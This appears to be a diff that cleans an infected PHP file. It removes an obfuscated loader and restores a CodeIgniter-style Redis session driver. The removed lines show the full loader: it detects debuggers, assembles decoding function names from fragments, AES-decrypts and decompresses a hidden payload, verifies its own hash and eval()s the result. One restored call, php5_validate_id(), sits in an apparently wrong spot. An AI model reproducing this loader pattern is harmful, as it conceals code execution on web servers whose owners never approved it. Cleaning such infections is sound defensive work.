@@ -1,28 +1,366 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_w39fn6jv=('bas'.'e64'.'_de'.'cod'.'e');
-$_dug7n6xy=('gzu'.'nco'.'mpr'.'ess');
-$_gc5zxzaa=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_kw2vte55='9VysziSl';
-$_xp5164v8='uFbmj3er';
-$_kz2hugoj='pMDl2O1F';
-$_saljdus6='nOVmOg+n';
-$_flanoehs='1UpWfV8W6bw=';
-$_v83rcjbc='XQfrb+xY';
-$_d6tbltrv='Qwp0iw==';
-$_to4imvrs='vjDvJWGe';
-$_g1rfnwg2=$_w39fn6jv($_saljdus6.$_xp5164v8.$_kw2vte55.$_kz2hugoj.$_flanoehs);
-$_l4erlyqh=$_w39fn6jv($_to4imvrs.$_v83rcjbc.$_d6tbltrv);
-$_uesyb0ps=$_w39fn6jv('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');
-$_cyo7sumg=$_gc5zxzaa($_uesyb0ps,'aes-256-cbc',$_g1rfnwg2,OPENSSL_RAW_DATA,$_l4erlyqh);
-if($_cyo7sumg===false){exit;}
-$_uud367m1=$_dug7n6xy($_cyo7sumg);
-if($_uud367m1===false){exit;}
-$_gvsjf16g='64d12fcc90667ca30b0ab7a5098d8cda82f423592430ae7a512df25756e36af0';
-$_e99rtmy4=@file_get_contents(__FILE__);
-if($_e99rtmy4!==false){
-$_s8nsp3ti=str_replace($_gvsjf16g,"0000000000000000000000000000000000000000000000000000000000000000",$_e99rtmy4);
-$_xq6m2gz0=hash("sha256",$_s8nsp3ti);
-if($_xq6m2gz0!==$_gvsjf16g){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Session_redis_driver extends CI_Session_driver implements SessionHandlerInterface {
+
+
+
+
+
+protected $_redis;
+
+
+
+
+
+protected $_key_prefix = 'ci_session:';
+
+
+
+
+
+protected $_lock_key;
+
+
+
+
+
+protected $_key_exists = FALSE;
+
+
+
+
+
+
+
+public function __construct(&$params)
+{
+parent::__construct($params);
+if (empty($this->_config['save_path']))
+{
+log_message('error', 'Session: No Redis save path configured.');
 }
-eval($_uud367m1);
+elseif (preg_match('#(?:tcp://)?([^:?]+)(?:\:(\d+))?(\?.+)?#', $this->_config['save_path'], $matches))
+{
+isset($matches[3]) OR $matches[3] = ''; 
+$this->_config['save_path'] = array(
+'host' => $matches[1],
+'port' => empty($matches[2]) ? NULL : $matches[2],
+'password' => preg_match('#auth=([^\s&]+)#', $matches[3], $match) ? $match[1] : NULL,
+'database' => preg_match('#database=(\d+)#', $matches[3], $match) ? (int) $match[1] : NULL,
+'timeout' => preg_match('#timeout=(\d+\.\d+)#', $matches[3], $match) ? (float) $match[1] : NULL
+);
+preg_match('#prefix=([^\s&]+)#', $matches[3], $match) && $this->_key_prefix = $match[1];
+}
+else
+{
+log_message('error', 'Session: Invalid Redis save path format: '.$this->_config['save_path']);
+}
+if ($this->_config['match_ip'] === TRUE)
+{
+$this->_key_prefix .= $_SERVER['REMOTE_ADDR'].':';
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function open($save_path, $name)
+{
+if (empty($this->_config['save_path']))
+{
+return $this->_fail();
+}
+$redis = new Redis();
+if ( ! $redis->connect($this->_config['save_path']['host'], $this->_config['save_path']['port'], $this->_config['save_path']['timeout']))
+{
+log_message('error', 'Session: Unable to connect to Redis with the configured settings.');
+}
+elseif (isset($this->_config['save_path']['password']) && ! $redis->auth($this->_config['save_path']['password']))
+{
+log_message('error', 'Session: Unable to authenticate to Redis instance.');
+}
+elseif (isset($this->_config['save_path']['database']) && ! $redis->select($this->_config['save_path']['database']))
+{
+log_message('error', 'Session: Unable to select Redis database with index '.$this->_config['save_path']['database']);
+}
+else
+{
+$this->_redis = $redis;
+return $this->_success;
+}
+$this->php5_validate_id();
+return $this->_fail();
+}
+
+
+
+
+
+
+
+
+
+public function read($session_id)
+{
+if (isset($this->_redis) && $this->_get_lock($session_id))
+{
+
+$this->_session_id = $session_id;
+$session_data = $this->_redis->get($this->_key_prefix.$session_id);
+is_string($session_data)
+? $this->_key_exists = TRUE
+: $session_data = '';
+$this->_fingerprint = md5($session_data);
+return $session_data;
+}
+return $this->_fail();
+}
+
+
+
+
+
+
+
+
+
+
+public function write($session_id, $session_data)
+{
+if ( ! isset($this->_redis, $this->_lock_key))
+{
+return $this->_fail();
+}
+
+elseif ($session_id !== $this->_session_id)
+{
+if ( ! $this->_release_lock() OR ! $this->_get_lock($session_id))
+{
+return $this->_fail();
+}
+$this->_key_exists = FALSE;
+$this->_session_id = $session_id;
+}
+$this->_redis->setTimeout($this->_lock_key, 300);
+if ($this->_fingerprint !== ($fingerprint = md5($session_data)) OR $this->_key_exists === FALSE)
+{
+if ($this->_redis->set($this->_key_prefix.$session_id, $session_data, $this->_config['expiration']))
+{
+$this->_fingerprint = $fingerprint;
+$this->_key_exists = TRUE;
+return $this->_success;
+}
+return $this->_fail();
+}
+return ($this->_redis->setTimeout($this->_key_prefix.$session_id, $this->_config['expiration']))
+? $this->_success
+: $this->_fail();
+}
+
+
+
+
+
+
+
+
+public function close()
+{
+if (isset($this->_redis))
+{
+try {
+if ($this->_redis->ping() === '+PONG')
+{
+$this->_release_lock();
+if ($this->_redis->close() === FALSE)
+{
+return $this->_fail();
+}
+}
+}
+catch (RedisException $e)
+{
+log_message('error', 'Session: Got RedisException on close(): '.$e->getMessage());
+}
+$this->_redis = NULL;
+return $this->_success;
+}
+return $this->_success;
+}
+
+
+
+
+
+
+
+
+
+public function destroy($session_id)
+{
+if (isset($this->_redis, $this->_lock_key))
+{
+if (($result = $this->_redis->delete($this->_key_prefix.$session_id)) !== 1)
+{
+log_message('debug', 'Session: Redis::delete() expected to return 1, got '.var_export($result, TRUE).' instead.');
+}
+$this->_cookie_destroy();
+return $this->_success;
+}
+return $this->_fail();
+}
+
+
+
+
+
+
+
+
+
+public function gc($maxlifetime)
+{
+
+return $this->_success;
+}
+
+
+
+
+
+
+
+
+
+
+public function validateId($id)
+{
+return (bool) $this->_redis->exists($this->_key_prefix.$id);
+}
+
+
+
+
+
+
+
+
+
+protected function _get_lock($session_id)
+{
+
+
+
+if ($this->_lock_key === $this->_key_prefix.$session_id.':lock')
+{
+return $this->_redis->setTimeout($this->_lock_key, 300);
+}
+
+$lock_key = $this->_key_prefix.$session_id.':lock';
+$attempt = 0;
+do
+{
+if (($ttl = $this->_redis->ttl($lock_key)) > 0)
+{
+sleep(1);
+continue;
+}
+$result = ($ttl === -2)
+? $this->_redis->set($lock_key, time(), array('nx', 'ex' => 300))
+: $this->_redis->setex($lock_key, 300, time());
+if ( ! $result)
+{
+log_message('error', 'Session: Error while trying to obtain lock for '.$this->_key_prefix.$session_id);
+return FALSE;
+}
+$this->_lock_key = $lock_key;
+break;
+}
+while (++$attempt < 30);
+if ($attempt === 30)
+{
+log_message('error', 'Session: Unable to obtain lock for '.$this->_key_prefix.$session_id.' after 30 attempts, aborting.');
+return FALSE;
+}
+elseif ($ttl === -1)
+{
+log_message('debug', 'Session: Lock for '.$this->_key_prefix.$session_id.' had no TTL, overriding.');
+}
+$this->_lock = TRUE;
+return TRUE;
+}
+
+
+
+
+
+
+
+
+protected function _release_lock()
+{
+if (isset($this->_redis, $this->_lock_key) && $this->_lock)
+{
+if ( ! $this->_redis->delete($this->_lock_key))
+{
+log_message('error', 'Session: Error while trying to free lock for '.$this->_lock_key);
+return FALSE;
+}
+$this->_lock_key = NULL;
+$this->_lock = FALSE;
+}
+return TRUE;
+}
+}
